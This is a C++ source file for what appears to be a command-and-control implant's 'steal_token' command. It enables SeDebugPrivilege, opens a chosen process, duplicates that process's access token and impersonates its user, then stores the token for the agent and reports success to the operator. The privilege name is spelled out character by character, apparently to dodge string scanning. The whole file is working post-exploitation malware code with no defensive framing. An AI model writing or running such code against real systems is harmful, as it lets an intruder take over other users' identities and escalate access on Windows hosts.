#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_STEAL_TOKEN

using namespace stardust;
using namespace starburst;

auto declfn starburst::cmd_steal_token(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t pid = parser_int32( params );
    if ( pid == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "invalid PID" ) ) );
        return;
    }

    // enable SeDebugPrivilege to access cross-user processes
    HANDLE h_self_token = nullptr;
    if ( inst.advapi32.OpenProcessToken(
            reinterpret_cast<HANDLE>( static_cast<LONG_PTR>( -1 ) ),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &h_self_token ) ) {
        TOKEN_PRIVILEGES tp = {};
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        WCHAR priv_name[] = { 'S','e','D','e','b','u','g','P','r','i','v','i','l','e','g','e', 0 };
        inst.advapi32.LookupPrivilegeValueW( nullptr, priv_name, &tp.Privileges[0].Luid );
        inst.advapi32.AdjustTokenPrivileges( h_self_token, FALSE, &tp, sizeof(tp), nullptr, nullptr );
        inst.kernel32.CloseHandle( h_self_token );
    }

    HANDLE h_proc = inst.kernel32.OpenProcess( PROCESS_QUERY_INFORMATION, FALSE, pid );
    if ( !h_proc ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "OpenProcess failed" ) ) );
        return;
    }

    HANDLE h_token = nullptr;
    if ( !inst.advapi32.OpenProcessToken( h_proc, TOKEN_DUPLICATE | TOKEN_QUERY, &h_token ) ) {
        inst.kernel32.CloseHandle( h_proc );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "OpenProcessToken failed" ) ) );
        return;
    }

    HANDLE h_dup = nullptr;
    if ( !inst.advapi32.DuplicateTokenEx(
            h_token,
            TOKEN_ALL_ACCESS,
            nullptr,
            SecurityImpersonation,
            TokenImpersonation,
            &h_dup ) ) {
        inst.kernel32.CloseHandle( h_token );
        inst.kernel32.CloseHandle( h_proc );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "DuplicateTokenEx failed" ) ) );
        return;
    }

    if ( !inst.advapi32.ImpersonateLoggedOnUser( h_dup ) ) {
        inst.kernel32.CloseHandle( h_dup );
        inst.kernel32.CloseHandle( h_token );
        inst.kernel32.CloseHandle( h_proc );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "ImpersonateLoggedOnUser failed" ) ) );
        return;
    }

    if ( inst.agent.impersonated_token )
        inst.kernel32.CloseHandle( inst.agent.impersonated_token );

    inst.agent.impersonated_token = h_dup;
    inst.kernel32.CloseHandle( h_token );
    inst.kernel32.CloseHandle( h_proc );

    char msg[64] = { 0 };
    str_copy( msg, symbol<char*>( const_cast<char*>( "stolen token from PID " ) ) );
    char num[12];
    int_to_str( num, pid, 10 );
    str_concat( msg, num );
    queue_response( inst, task_uuid, RESPONSE_SUCCESS, msg );
}

#endif
